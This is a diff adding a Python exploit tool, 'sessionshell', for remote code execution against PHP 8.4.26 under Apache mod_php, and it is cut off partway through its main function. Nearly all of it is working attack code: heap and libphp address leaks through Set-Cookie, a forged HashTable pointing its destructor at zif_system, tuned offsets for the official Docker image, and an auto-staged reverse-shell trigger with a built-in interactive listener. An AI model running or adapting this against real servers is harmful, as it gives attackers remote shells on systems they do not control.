@@ -1,0 +1,990 @@
+#!/usr/bin/env python3
+"""
+sessionshell - one-click remote exploit for PHP 8.4.26 / mod_php, prefork.
+
+Derived from 9bie's php2shell-bypass-aslr-exp chain (credited in README).
+Local additions: container/URL auto-resolution, auto-staging of the reverse
+shell trigger, built-in interactive shell listener, proof-file fallback logic.
+
+Default profile: official php:8.4.26-apache image (Apache 2.4.69).
+Lab build (Apache 2.4.68, minimal PHP): use --profile lab.
+
+Chain (all attacker traffic is plain HTTP):
+  stage 0  HTTP worker rotation
+  stage 1  Set-Cookie heap leak        -> Zend MM chunk base
+  stage 2  Set-Cookie libphp leak      -> libphp base (ZVAL_PTR_DTOR)
+  stage 3  upload_progress fake-ref    -> pDestructor = zif_system
+
+Requirements on the target (the shipped docker/ setup matches these settings):
+  display_errors=1, memory_limit=8M, max_input_vars=1000,
+  session.use_cookies=1, session.use_strict_mode=0,
+  session.upload_progress.enabled=1, single-worker prefork.
+
+Usage:
+  python3 sessionshell.py -u http://127.0.0.1:8088/index.php
+  python3 sessionshell.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1
+  python3 sessionshell.py -u http://127.0.0.1:8088/index.php -c 'id>/tmp/p1' --proof-file /tmp/p1
+
+The command is embedded in a 167-byte live zend_string; the maximum command
+length for this payload layout is 14 bytes.  For a longer command, chain it
+through a short shell trigger, e.g. `sh</out/c` (8 bytes).
+"""
+
+from __future__ import annotations
+
+import argparse
+import os
+import re
+import select
+import socket
+import ssl
+import struct
+import subprocess
+import threading
+import sys
+import time
+import urllib.parse
+from collections import Counter
+
+# Offsets for the lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).
+# They are relative to the libphp.so / Zend MM chunk base, so they do not
+# depend on ASLR.  Rebuilds can shift them; pass --zif-offset/--dtor-offset.
+ZIF_OFFSET = 0x43A870       # zif_system
+DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
+HTDATA_OFFSET = 0x6E0D8     # live 167-byte string used as fake HashTable
+MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL
+
+# bookworm (official php:8.4.26-apache) calibration, measured on the image
+BOOKWORM_STAGE1_N = 841
+BOOKWORM_STAGE2_T = 406
+BOOKWORM_STAGE2_V = 16
+BOOKWORM_HTDATA_OFFSET = 0x690D8
+BOOKWORM_STAGE3_PADS = [(31, 31)] * 6
+
+SID = b"attacksessionid0001"
+DEFAULT_CMD = "id>/out/p1"
+
+# Fallback OOM field size, in MB, when the target's memory_limit cannot be
+# read. Comfortably over a bare 8M target (the shipped lab default).
+DEFAULT_HUGE_MB = 12
+_HERE = os.path.dirname(os.path.abspath(__file__))
+DEFAULT_PROOF = os.path.join(_HERE, "out", "p1")
+DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")
+
+
+
+def build_multipart(parts, boundary: bytes) -> bytes:
+    out = bytearray()
+    for p in parts:
+        name = p["name"].encode()
+        out += b"--" + boundary + b"\r\n"
+        out += b'Content-Disposition: form-data; name="' + name + b'"'
+        if p.get("filename") is not None:
+            out += b'; filename="' + p["filename"].encode() + b'"'
+            out += b"\r\nContent-Type: application/octet-stream"
+        out += b"\r\n\r\n" + p["data"] + b"\r\n"
+    out += b"--" + boundary + b"--\r\n"
+    return bytes(out)
+
+
+def container_for_url(url: str) -> str | None:
+    """Find the local container publishing the port the target URL points at.
+
+    `--docker-container` defaults to the exploit's own compose service name.
+    When the target is one of the lab containers we have to ask docker which
+    container owns that port, otherwise the proof path is resolved against the
+    wrong container and a successful run still looks like a failure.
+    """
+    u = urllib.parse.urlsplit(url)
+    if (u.hostname or "") not in ("127.0.0.1", "localhost", "::1"):
+        return None
+    port = u.port or (443 if u.scheme == "https" else 80)
+    try:
+        out = subprocess.run(
+            ["docker", "ps", "--format", "{{.Names}}\t{{.Ports}}"],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    for line in out.stdout.splitlines():
+        if "\t" not in line:
+            continue
+        name, ports = line.split("\t", 1)
+        for spec in ports.split(","):
+            # e.g. "127.0.0.1:8091->80/tcp"
+            if "->" not in spec:
+                continue
+            host_side = spec.split("->", 1)[0]
+            if host_side.rsplit(":", 1)[-1].strip() == str(port):
+                return name.strip()
+    return None
+
+
+def memory_limit_mb(container: str) -> int | None:
+    """Ask the container for its PHP memory_limit, in whole MB.
+
+    The OOM field has to exceed this, or `php_session_initialize()` never
+    bails and stage 1 has nothing to leak. The default of 12 works for a
+    bare 8M target; a framework sitting at 128M needs a correspondingly
+    larger field, and guessing wrong looks exactly like a failed exploit.
+    """
+    try:
+        out = subprocess.run(
+            ["docker", "exec", container, "php", "-r",
+             "echo ini_get('memory_limit');"],
+            capture_output=True, text=True, timeout=20,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    raw = out.stdout.strip()
+    if not raw or raw == "-1":
+        return None
+    m = re.fullmatch(r"(\d+)([KMG]?)", raw, re.I)
+    if not m:
+        return None
+    n, unit = int(m.group(1)), m.group(2).upper()
+    return {"": n // (1024 * 1024), "K": n // 1024, "M": n, "G": n * 1024}[unit]
+
+
+
+def container_mount(container: str, dest: str) -> str | None:
+    """Return the host path bind-mounted at `dest` inside `container`."""
+    if not container:
+        return None
+    try:
+        out = subprocess.run(
+            ["docker", "inspect", container, "--format",
+             '{{range .Mounts}}{{.Destination}}\t{{.Source}}{{println}}{{end}}'],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    for line in out.stdout.splitlines():
+        if "\t" not in line:
+            continue
+        d, src = line.split("\t", 1)
+        if d.strip() == dest:
+            return src.strip() or None
+    return None
+
+
+def host_lan_ip() -> str | None:
+    """Best-effort local LAN address, without sending any packets."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+        finally:
+            s.close()
+    except OSError:
+        return None
+
+
+def serve_reverse_shell(port: int, ready: threading.Event | None = None) -> None:
+    """Listen for the callback and hand the operator a raw interactive shell.
+
+    Deliberately dependency-free: no netcat needed, and no shell quoting
+    problems around pty allocation. The bytes are piped straight between this
+    terminal and the socket, so `cd`, Ctrl-C and Ctrl-D behave normally.
+    """
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind(("0.0.0.0", port))
+    except OSError as e:
+        print(f"[-] cannot listen on :{port}: {e}", file=sys.stderr)
+        print("    another listener may still be running; pick another port",
+              file=sys.stderr)
+        return
+    srv.listen(1)
+    if ready is not None:
+        ready.set()
+    print(f"[*] listening on 0.0.0.0:{port} -- waiting for callback", flush=True)
+
+    try:
+        conn, addr = srv.accept()
+    except KeyboardInterrupt:
+        srv.close()
+        return
+    srv.close()
+    print(f"[+] shell connected from {addr[0]}:{addr[1]}", flush=True)
+    print("[*] type commands; Ctrl-D or `exit` to close\n", flush=True)
+
+    if os.name != "nt":
+        try:
+            import termios
+            import tty
+            saved = termios.tcgetattr(sys.stdin.fileno())
+            tty.setraw(sys.stdin.fileno())
+        except Exception:
+            # Not a real TTY (piped output, CI, wrapper). Fall back to
+            # line-buffered stdin rather than killing the session thread --
+            # the socket is still usable, it just won't be a raw terminal.
+            saved = None
+        try:
+            _pump(conn)
+        finally:
+            if saved is not None:
+                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, saved)
+    else:
+        _pump(conn)
+    conn.close()
+    print("\n[*] session closed", flush=True)
+
+
+def _pump(conn: socket.socket) -> None:
+    """Shuttle bytes between stdin and the socket until either side closes.
+
+    stdin reaching EOF must NOT tear the session down: under a pipeline or a
+    non-tty stdin the reader hits EOF immediately, and exiting there would
+    drop a shell that is still perfectly usable. Only the socket closing ends
+    the session.
+    """
+    conn.settimeout(None)
+    stdin_fd = sys.stdin.fileno()
+    stdin_open = True
+    while True:
+        watch = [conn] + ([sys.stdin] if stdin_open else [])
+        try:
+            r, _, _ = select.select(watch, [], [], 1.0)
+        except (OSError, ValueError):
+            return
+        if conn in r:
+            try:
+                data = conn.recv(4096)
+            except OSError:
+                return
+            if not data:
+                return
+            sys.stdout.write(data.decode("utf-8", "replace"))
+            sys.stdout.flush()
+        if stdin_open and sys.stdin in r:
+            try:
+                line = os.read(stdin_fd, 4096)
+            except OSError:
+                line = b""
+            if not line:
+                stdin_open = False  # keep serving; just stop watching stdin
+                continue
+            try:
+                conn.sendall(line)
+            except OSError:
+                return
+
+
+def container_docroot(container: str) -> str | None:
+    """Return the DocumentRoot Apache actually serves from inside `container`.
+
+    Not every lab target serves `/var/www/html` directly: Laravel's vhost points
+    at `/var/www/html/public`. A trigger that hardcodes the wrong path writes a
+    file nobody can reach, and the shell silently never connects.
+    """
+    if not container:
+        return None
+    try:
+        out = subprocess.run(
+            ["docker", "exec", container, "sh", "-c",
+             "grep -hioE 'DocumentRoot[[:space:]]+[^[:space:]]+' "
+             "/etc/apache2/sites-enabled/*.conf 2>/dev/null"],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    for line in out.stdout.splitlines():
+        parts = line.split()
+        if len(parts) == 2:
+            return parts[1].strip()
+    return None
+
+
+def stage_trigger_for_container(cmd: str, container: str, port: int = 4444) -> str | None:
+    """Stage the reverse-shell trigger so `sh</out/r` has something to run.
+
+    `sh</out/r` needs `/out/r` to exist *inside the target container*, and the
+    file must name this Mac's LAN address before the payload fires. Staging it
+    here means the documented one-liner works on its own and nobody has to
+    remember a separate setup step.
+    """
+    m = re.search(r"<(/out/(\S+))", cmd)
+    if not m:
+        return None
+    inner, script = m.group(1), m.group(2)
+    outdir = container_mount(container, "/out")
+    if not outdir:
+        return None
+    path = os.path.join(outdir, script)
+    if os.path.exists(path):
+        return path  # already staged (e.g. by rev.sh); do not clobber
+    ip = host_lan_ip()
+    if not ip:
+        return None
+    docroot = container_docroot(container) or "/var/www/html"
+    trigger = (
+        f"cp /usr/local/share/lab/rev.php {docroot}/r.php 2>/dev/null || "
+        f"cp /out/.rev.php {docroot}/r.php\n"
+        f"chmod 644 {docroot}/r.php\n"
+        f'curl -s -m 20 "http://127.0.0.1/r.php?ip={ip}&port={port}" >/dev/null 2>&1 &\n'
+    )
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(trigger)
+        os.chmod(path, 0o755)
+    except OSError:
+        return None
+    return path
+
+
+def resolve_local_proof(cmd: str, container: str) -> str | None:
+    """Map a write inside the target container to a path on this host.
+
+    The exploit command runs inside the target container, so `id>/out/p1`
+    writes to the container's /out.  The default proof path used to be
+    <repo>/out/p1, which is only correct when the *exploit's own* compose
+    stack is the target.  When pointing at one of the lab containers, that
+    file never appears and a successful run still reported EXPLOIT_FAILED.
+    Asking docker where the container's /out really lives fixes that.
+    """
+    if not container:
+        return None
+    m = re.search(r">>?\s*(/\S+)", cmd)
+    if not m:
+        return None
+    dest = m.group(1)
+    if "/out/" not in dest and not dest.startswith("/out"):
+        return None
+    try:
+        out = subprocess.run(
+            ["docker", "inspect", container, "--format",
+             '{{range .Mounts}}{{if eq .Destination "/out"}}{{.Source}}{{end}}{{end}}'],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return None
+    src = out.stdout.strip()
+    if not src:
+        return None
+    return os.path.join(src, os.path.basename(dest))
+
+
+def read_offsets_file(path: str) -> dict[str, int]:
+    """Read ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. written by docker/offsets.py."""
+    vals: dict[str, int] = {}
+    if not path:
+        return vals
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#") or "=" not in line:
+                    continue
+                key, val = line.split("=", 1)
+                vals[key.strip()] = int(val.strip(), 0)
+    except (OSError, ValueError):
+        pass
+    return vals
+
+
+class Target:
+    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True):
+        u = urllib.parse.urlsplit(url)
+        if u.scheme not in ("http", "https"):
+            raise ValueError("URL must be http:// or https://")
+        self.https = u.scheme == "https"
+        self.host = u.hostname or "127.0.0.1"
+        self.port = u.port or (443 if self.https else 80)
+        self.path = u.path or "/"
+        self.timeout = timeout
+        self.verbose = verbose
+
+    def log(self, msg: str) -> None:
+        if self.verbose:
+            print(msg, flush=True)
+
+    def _connect(self):
+        last = None
+        for _ in range(10):
+            try:
+                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
+                if self.https:
+                    ctx = ssl.create_default_context()
+                    s = ctx.wrap_socket(s, server_hostname=self.host)
+                try:
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                except OSError:
+                    pass
+                return s
+            except OSError as e:
+                last = e
+                time.sleep(0.3)
+        raise last  # type: ignore[misc]
+
+    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
+             timeout: float | None = None,
+             extra_headers: dict[str, str] | None = None) -> bytes:
+        extra = ""
+        for k, v in (extra_headers or {}).items():
+            extra += f"{k}: {v}\r\n"
+        hdr = (
+            f"POST {self.path} HTTP/1.1\r\n"
+            f"Host: {self.host}:{self.port}\r\n"
+            f"{extra}"
+            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
+            f"Content-Length: {len(body)}\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+        ).encode()
+        s = self._connect()
+        s.settimeout(timeout or self.timeout)
+
+        # Read concurrently with the upload: some exploit requests make the
+        # worker abort right after sending Set-Cookie, and a recv() that starts
+        # after the RST loses the already-buffered response.
+        data = bytearray()
+
+        def _reader() -> None:
+            try:
+                while len(data) < read_cap:
+                    chunk = s.recv(65536)
+                    if not chunk:
+                        break
+                    data.extend(chunk)
+            except OSError:
+                pass
+
+        reader = threading.Thread(target=_reader, daemon=True)
+        reader.start()
+        try:
+            try:
+                s.sendall(hdr)
+                mv = memoryview(body)
+                for off in range(0, len(body), 262144):
+                    s.sendall(mv[off:off + 262144])
+            except OSError:
+                pass  # the worker may abort while the body is still in flight
+            reader.join(timeout=(timeout or self.timeout) + 1.0)
+            return bytes(data)
+        finally:
+            s.close()
+
+    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
+        hdr = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {self.host}:{self.port}\r\n"
+            "Connection: close\r\n"
+            "\r\n"
+        ).encode()
+        s = self._connect()
+        s.settimeout(self.timeout)
+        try:
+            s.sendall(hdr)
+            data = bytearray()
+            try:
+                while len(data) < read_cap:
+                    chunk = s.recv(65536)
+                    if not chunk:
+                        break
+                    data += chunk
+            except OSError:
+                pass
+        finally:
+            s.close()
+        head, _, body = bytes(data).partition(b"\r\n\r\n")
+        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
+        return (int(m.group(1)) if m else 0), body
+
+
+def parse_cookie(resp: bytes) -> bytes:
+    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
+    if not m:
+        return b""
+    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
+
+
+def chunk_base_from_cookie(raw: bytes) -> int:
+    """Stage 1: 2MB-aligned mode of the heap pointers in the decoded cookie."""
+    if len(raw) < 1000:
+        return 0
+    c: Counter[int] = Counter()
+    for i in range(len(raw) - 8):
+        v = int.from_bytes(raw[i:i + 8], "little")
+        if 0x7F0000000000 <= v < 0x800000000000:
+            c[v & ~0x1FFFFF] += 1
+    if not c:
+        return 0
+    base, count = c.most_common(1)[0]
+    return base if count >= 8 else 0
+
+
+def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
+    """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor.
+
+    The page-aligned check is 4KB, not 2MB: the lab build happened to map
+    libphp at a 2MB boundary, but the official php:8.4.26-apache image maps it
+    at a 4KB boundary (e.g. base 0x...acdb000).
+    """
+    if len(raw) < 16:
+        return 0
+    p = int.from_bytes(raw[8:16], "little")
+    if not (0x7F0000000000 <= p < 0x800000000000):
+        return 0
+    if p & 0xFFF != dtor_offset & 0xFFF:
+        return 0
+    base = p - dtor_offset
+    return base if base & 0xFFF == 0 else 0
+
+
+class Exploit:
+    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
+                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
+                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab"):
+        self.t = target
+        self.cmd = cmd.encode()
+        self.zif_offset = zif_offset
+        self.dtor_offset = dtor_offset
+        self.htdata_offset = htdata_offset
+        self.huge_mb = huge_mb
+        self.verbose = verbose
+        self.profile = profile
+        if profile == "bookworm":
+            # official php:8.4.26-apache (Debian 12, Apache 2.4.69)
+            self.stage1_n = BOOKWORM_STAGE1_N
+            self.stage2_t = BOOKWORM_STAGE2_T
+            self.stage2_v = BOOKWORM_STAGE2_V
+            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
+            self.stage3_carrier = True
+        else:
+            self.stage1_n = 892
+            self.stage2_t = 443
+            self.stage2_v = 1
+            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
+            self.stage3_carrier = False
+
+    # ---------- request primitives (shapes match tools/*.py) ----------
+
+    def _big_field(self) -> dict:
+        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}
+
+    def _file_part(self) -> dict:
+        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
+
+    def rotate(self) -> None:
+        """Abort the current worker over HTTP; prefork forks a fresh one."""
+        self.t.log("[*] rotating worker over HTTP")
+        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
+        parts += [
+            {"name": "PHPSESSID", "data": b"\x00"},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+            self._file_part(),
+            self._big_field(),
+        ]
+        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
+                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
+        time.sleep(0.3)
+        # Session-initializing B with no file part: pre-RINIT cleanup walks the
+        # corrupted heap and the child aborts.
+        parts = [
+            {"name": "PHPSESSID", "data": SID},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+        ]
+        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
+                    read_cap=65536, timeout=20.0)
+        time.sleep(0.5)
+
+    def stage1(self) -> int:
+        """Leak the Zend MM chunk base."""
+        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
+        parts += [
+            {"name": "PHPSESSID", "data": b"\x00"},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+            self._file_part(),
+            self._big_field(),
+        ]
+        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
+                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
+        time.sleep(0.2)
+
+        parts = [
+            {"name": "PHPSESSID", "data": SID},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+        ]
+        for i in range(self.stage1_n):
+            val = (f"v{i:04d}" + "x" * 44)[:48]
+            parts.append({"name": str(1000 + i), "data": val.encode()})
+        forge = bytearray(b"A" * 79)
+        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
+        forge[0x18] = ord("L")
+        parts.append({"name": "1999", "data": bytes(forge)})
+
+        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
+                           read_cap=9 << 20)
+        return chunk_base_from_cookie(parse_cookie(resp))
+
+    def stage2(self) -> int:
+        """Leak libphp base through a 56-byte HashTable page."""
+        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
+        parts += [
+            {"name": "PHPSESSID", "data": b"\x00"},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+            self._file_part(),
+            self._big_field(),
+        ]
+        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
+                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
+        time.sleep(0.2)
+
+        parts = [
+            {"name": "PHPSESSID", "data": SID},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+        ]
+        for i in range(983):
+            cnt = 16 if i == self.stage2_t else 1
+            for j in range(cnt):
+                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
+
+        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
+                           read_cap=1 << 20)
+        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)
+
+    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
+        cmd = self.cmd
+        if len(cmd) > MAX_CMD:
+            raise ValueError(
+                f"command is {len(cmd)} bytes; the 167-byte carrier allows at most "
+                f"{MAX_CMD} (e.g. use 'sh</out/c')"
+            )
+        ht = bytearray(b"\x00" * 167)
+        # fake HashTable
+        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
+        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
+        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
+        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
+        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
+        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
+        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
+        # fake execute_data at E = data+0x20
+        E = 0x20
+        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
+        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
+        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
+        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
+        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
+        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
+        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
+        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
+        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
+        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
+        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
+        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
+        # fake zend_string at data+0x80
+        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
+        struct.pack_into("<Q", ht, 0x88, 0)                     # h
+        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
+        ht[0x98:0x98 + len(cmd)] = cmd
+        ht[0x98 + len(cmd)] = 0
+
+        # fake reference (55 bytes) placed at R0-0x10
+        ref = bytearray(b"X" * 55)
+        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
+        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
+        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
+        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
+        return bytes(ht), bytes(ref)
+
+    def stage3(self, htdata: int, zif: int) -> None:
+        """Write the fake reference over PS(http_session_vars) and execute."""
+        parts = [
+            {"name": "PHPSESSID", "data": b"a" * 19},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
+        ]
+        specs = self.stage3_pads
+        for i, (nl, vl) in enumerate(specs):
+            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
+            parts.append({"name": name, "data": b"V" * vl})
+        parts += [self._file_part(), self._big_field()]
+        extra = None
+        if self.profile == "bookworm":
+            # Keep PS(id) valid: php_session_initialize then leaves
+            # send_cookie=0, so B's init does not allocate the Set-Cookie
+            # header at R0+16 (which would clobber val.type).
+            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
+        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
+                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
+                    extra_headers=extra)
+        time.sleep(0.3)
+
+        ht, ref = self._fake_payload(htdata, zif)
+        parts = [
+            {"name": "PHPSESSID", "data": SID},
+            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
+        ]
+        if self.stage3_carrier:
+            # The bookworm reference is still alive (rc=2).  A 15-byte
+            # bin-40 zend_string lands its chars exactly at
+            # PS(http_session_vars): keep gc (rc=1, IS_REFERENCE), rewrite the
+            # low 7 bytes of val.value to the fake HashTable, and let the
+            # high byte stay 0x00 (canonical 0x00007f... pointer).
+            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
+            for i in range(2):
+                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
+            parts.append({"name": "g00", "data": carrier})
+            for i in range(15):
+                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
+        else:
+            for i in range(15):
+                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
+            for i in range(2):
+                parts.append({"name": f"f{i:02d}", "data": ref})
+        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
+                    read_cap=65536, timeout=30.0)
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(
+        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+    )
+    ap.add_argument("-u", "--url", required=True,
+                    help="target PHP page, e.g. http://127.0.0.1:8088/index.php")
+    ap.add_argument("-c", "--cmd", default=None,
+                    help=f"command to execute (max {MAX_CMD} bytes). "
+                         f"Default: drop an interactive shell (see --shell)")
+    ap.add_argument("--shell", action="store_true",
+                    help="deliver a reverse shell and give you an interactive "
+                         "session in this terminal (default when -c is omitted)")
+    ap.add_argument("--shell-port", type=int, default=4444,
+                    help="local port to listen on for --shell")
+    ap.add_argument("--proof-file", default=None,
+                    help="read this local file after exploitation; '' disables. "
+                         "Defaults to the host path behind the target container's "
+                         "/out mount when the command writes there.")
+    ap.add_argument("--fetch", default="",
+                    help="GET this path afterwards (for commands writing to webroot)")
+    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
+                    help=f"offset of zif_system in libphp.so (default: offsets file or 0x{ZIF_OFFSET:x})")
+    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
+                    help=f"offset of ZVAL_PTR_DTOR in libphp.so (default: offsets file or 0x{DTOR_OFFSET:x})")
+    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm",
+                    help="target build profile: bookworm (official image, default) or lab (Apache 2.4.68)")
+    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
+                    help="chunk-relative offset of the 167-byte live string")
+    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS,
+                    help="read libphp offsets from this file ('' to disable)")
+    ap.add_argument("--docker-container", default="php2shell-target",
+                    help="container used to auto-derive offsets on localhost")
+    ap.add_argument("--no-auto-offsets", action="store_true",
+                    help="never run docker/offsets.py automatically")
+    ap.add_argument("--huge-mb", type=int, default=argparse.SUPPRESS, metavar="MB",
+                    help="size of the OOM field; must exceed memory_limit. "
+                         "Default: read from the target's memory_limit")
+    ap.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
+    ap.add_argument("--no-pre-rotate", action="store_true",
+                    help="skip the initial worker rotation")
+    ap.add_argument("--no-retry-rotate", action="store_true",
+                    help="do not rotate between failed stage attempts")
+    ap.add_argument("--retries", type=int, default=3,
+                    help="attempts per leak stage; stage 3 uses retries+2")
+    ap.add_argument("-q", "--quiet", action="store_true")
+    args = ap.parse_args()
+
+    # No -c and no --shell flag means "just get me a shell".
+    if args.cmd is None:
+        args.shell = True
+        args.cmd = f"sh</out/r"
+
+    if len(args.cmd.encode()) > MAX_CMD:
+        ap.error(f"--cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")
+
+    if args.htdata_offset is None:
+        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
+                              else HTDATA_OFFSET)
+
+    local_offsets = read_offsets_file(args.offsets_file)
+    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)
+
+    # A local docker target may be built from a different image/toolchain than
+    # the lab; ask the container for its real libphp offsets once.
+    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
+            and t.host in ("127.0.0.1", "localhost", "::1")):
+        helper = os.path.join(_HERE, "docker", "offsets.py")
+        if os.path.exists(helper):
+            if not args.quiet:
+                print("[*] no offsets file; reading libphp symbols from "
+                      f"container {args.docker_container}", flush=True)
+            try:
+                subprocess.run(
+                    [sys.executable, helper, args.docker_container, args.offsets_file],
+                    check=False, timeout=60,
+                    stdout=None if not args.quiet else subprocess.DEVNULL,
+                    stderr=None if not args.quiet else subprocess.DEVNULL,
+                )
+            except (OSError, subprocess.SubprocessError):
+                pass
+            local_offsets = read_offsets_file(args.offsets_file)
+
+    if args.zif_offset is None:
+        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
+    if args.dtor_offset is None:
+        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)
+
+    # Size the OOM field to the target's own memory_limit. The default suits a
+    # bare 8M target; a framework at 128M silently fails stage 1 without this.
+    if getattr(args, "huge_mb", None) is None:
+        probe = container_for_url(args.url) or args.docker_container
+        lim = memory_limit_mb(probe)
+        if lim:
+            args.huge_mb = max(DEFAULT_HUGE_MB, lim + lim // 4)
+            t.log(f"[*] target memory_limit={lim}M; OOM field {args.huge_mb} MB")
+        else:
+            args.huge_mb = DEFAULT_HUGE_MB
+
